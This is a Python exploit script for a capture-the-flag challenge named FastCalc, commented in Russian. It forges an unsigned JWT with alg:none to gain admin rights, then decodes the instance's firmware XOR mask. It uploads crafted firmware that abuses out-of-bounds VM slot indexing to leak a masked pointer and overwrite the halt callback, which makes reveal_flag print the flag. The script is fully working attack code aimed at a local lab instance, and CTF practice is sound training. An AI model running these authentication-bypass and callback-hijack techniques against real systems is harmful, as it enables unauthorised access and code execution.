#!/usr/bin/env python3
"""Эксплойт для FastCalc: JWT alg:none -> админ -> вредоносная прошивка
(слоты 8..11 ломают проверку PICK/PUT) -> утечка и вызов reveal_flag.

Идея решения:
  1. Логинимся гостем, разбираем выданный JWT: ручная проверка подписи
     смотрит только на HS256, а заголовок с alg:none принимается без
     проверки — форжим токен с role=admin и пустой подписью.
  2. Скачиваем текущую прошивку: из её заголовка берём key (маска XOR
     инстанса) и flags — они нужны, чтобы собрать валидный образ-пейлоад.
  3. VM регистров всего 8, а PICK/PUT индексируют слоты 0..11: слот 10 —
     halt_slot (адрес колбэка завершения), слот 11 — secret_slot (адрес
     reveal_flag); оба хранятся замаскированными cookie процесса.
  4. Прошивка A (PICK 11 -> OUTHEX -> HALT): чтение слота 11 «армбит»
     запись в слот 10 и заодно утечет адрес reveal_flag ^ cookie.
  5. Прошивка B (MOVI <утёкший адрес> -> PUT 10 -> HALT): подменяем
     halt_slot на утёкший адрес — HALT вызывает его как колбэк, и
     reveal_flag печатает флаг в ответе /api/calculate.

Запуск:  python3 solve.py [url]   (по умолчанию http://127.0.0.1:13444)
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import struct
import sys
import time
import urllib.error
import urllib.request
import zlib

IMAGE_HEADER = struct.Struct("<4sHHIIIIIII")
HEADER_SIZE = IMAGE_HEADER.size
MAGIC = b"FWM2"
VERSION = 2
FLAGS = 1
OP_MOVI = 0x01
OP_OUTHEX = 0x0C
OP_PICK = 0x0D
OP_PUT = 0x0E
OP_HALT = 0x0F


def http(base: str, path: str, *, method: str = "GET", body: bytes | None = None,
         content_type: str | None = None, token: str | None = None) -> bytes:
    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    if token:
        headers["Cookie"] = f"fastcalc_token={token}"
    req = urllib.request.Request(base.rstrip("/") + path, data=body,
                                 headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read()
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode("utf-8", "replace")
        raise RuntimeError(f"{method} {path}: HTTP {exc.code}: {detail}") from exc


def login_guest(base: str) -> str:
    body = json.dumps({"username": "guest", "password": ""}).encode()
    response = json.loads(http(base, "/api/login", method="POST", body=body,
                               content_type="application/json"))
    token = response.get("token")
    if not response.get("ok") or not isinstance(token, str):
        raise RuntimeError(f"guest login failed: {response}")
    return token


def _b64_json(value: dict) -> str:
    encoded = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(encoded).rstrip(b"=").decode()


def forge_admin_token(guest_token: str) -> str:
    # claims гостевого токена дописываем role=admin и свежий exp; подпись
    # отбрасываем — заголовок alg:none говорит серверу, что её нет
    parts = guest_token.split(".")
    if len(parts) != 3:
        raise RuntimeError("server returned a malformed JWT")
    padding = "=" * (-len(parts[1]) % 4)
    claims = json.loads(base64.urlsafe_b64decode((parts[1] + padding).encode()))
    claims["role"] = "admin"
    claims["exp"] = int(time.time()) + 3600
    header = {"typ": "JWT", "alg": "none"}
    return f"{_b64_json(header)}.{_b64_json(claims)}."


def decode_mask(key: int, index: int) -> int:
    # маска одного байта: младший «лейн» key выбирается двумя битами
    # индекса, затем аффинное смешение с номером байта и слота
    lane = (key >> ((index & 3) * 8)) & 0xFF
    return (lane + index * 0x3D + (index // 4) * 0x17) & 0xFF


def crypt(payload: bytes, key: int) -> bytes:
    # XOR-гамма симметрична: одна функция и шифрует, и расшифровывает
    return bytes(value ^ decode_mask(key, i) for i, value in enumerate(payload))


def parse_image(image: bytes) -> tuple[int, int, int, int, bytes]:
    if len(image) < HEADER_SIZE:
        raise RuntimeError("downloaded image is too short")
    magic, version, header_size, code_len, const_len, entry, flags, crc, key, reserved = (
        IMAGE_HEADER.unpack_from(image)
    )
    if magic != MAGIC or version != VERSION or header_size != HEADER_SIZE:
        raise RuntimeError("unexpected firmware format")
    if flags != FLAGS or reserved != 0:
        raise RuntimeError("unexpected firmware flags")
    if header_size + code_len + const_len != len(image):
        raise RuntimeError("firmware length mismatch")
    plain = crypt(image[header_size:], key)
    # CRC считается по расшифрованному payload — контроль, что key верный
    if zlib.crc32(plain) & 0xFFFFFFFF != crc:
        raise RuntimeError("firmware CRC mismatch")
    return key, flags, code_len, const_len, plain


def image_for(code: bytes, *, key: int, flags: int, const: bytes = b"") -> bytes:
    if not code or len(code) > 1024 or len(const) > 512:
        raise RuntimeError("payload is outside VM limits")
    plain = code + const
    header = IMAGE_HEADER.pack(
        MAGIC, VERSION, HEADER_SIZE, len(code), len(const), 0, flags,
        zlib.crc32(plain) & 0xFFFFFFFF, key, 0,
    )
    return header + crypt(plain, key)


def upload(base: str, image: bytes, token: str) -> None:
    response = json.loads(http(base, "/api/upload", method="POST", body=image,
                               content_type="application/octet-stream", token=token))
    if not response.get("ok"):
        raise RuntimeError(f"upload rejected: {response}")


def calculate(base: str, token: str) -> str:
    payload = json.dumps({
        "a": "13", "b": "4", "op": "+",
        "input_base": 10, "output_base": 10,
    }).encode()
    response = json.loads(http(base, "/api/calculate", method="POST", body=payload,
                               content_type="application/json", token=token))
    if not response.get("ok"):
        raise RuntimeError(f"calculator rejected firmware: {response}")
    return str(response["value"])


def main() -> int:
    parser = argparse.ArgumentParser(description="solve the FastCalc instance")
    parser.add_argument("url", nargs="?", default="http://127.0.0.1:13444",
                        help="instance URL (default http://127.0.0.1:13444)")
    args = parser.parse_args()
    base = args.url.rstrip("/")

    guest_token = login_guest(base)
    admin_token = forge_admin_token(guest_token)
    # ключ и flags берём из живой прошивки: у каждого инстанса маска своя,
    # а upload с чужим key пройдёт, но VM расшифрует мусор
    original = http(base, "/api/firmware", token=admin_token)
    key, flags, _code_len, _const_len, plain = parse_image(original)
    print(f"[+] firmware: {len(original)} bytes, decoded payload: {plain[:16].hex()}")


    # прошивка A: PICK r3,11 читает secret_slot (адрес reveal_flag ^ cookie)
    # и армит запись в слот 10, OUTHEX печатает его на свет, HALT завершает
    # чисто (без вызова колбэка — его адрес всё ещё валиден)
    stage1_code = bytes([
        OP_PICK, 3, 11,
        OP_OUTHEX, 3,
        OP_HALT, 3,
    ])
    upload(base, image_for(stage1_code, key=key, flags=flags), admin_token)
    leaked = calculate(base, admin_token)
    match = re.search(r"0x[0-9a-fA-F]{16}", leaked)
    if not match:
        raise RuntimeError(f"stage one did not leak a pointer: {leaked!r}")
    encoded_callback = int(match.group(0), 16)
    print(f"[+] encoded callback: {encoded_callback:#018x}")


    # прошивка B: слот 10 (halt_slot) уже доступен для записи — кладём в него
    # утёкший адрес (он уже в замаскированной форме, размывать не нужно),
    # и HALT вызывает его как колбэк завершения: это reveal_flag
    stage2_code = bytes([OP_MOVI, 3]) + struct.pack("<Q", encoded_callback)
    stage2_code += bytes([OP_PUT, 10, 3, OP_HALT, 3])
    upload(base, image_for(stage2_code, key=key, flags=flags), admin_token)
    value = calculate(base, admin_token)
    flag = re.search(r"(?i)innoctf\{[^}\r\n]+\}", value)
    if not flag:
        raise RuntimeError(f"stage two returned unexpected output: {value!r}")
    print(f"[+] flag: {flag.group(0)}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (RuntimeError, OSError, urllib.error.URLError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
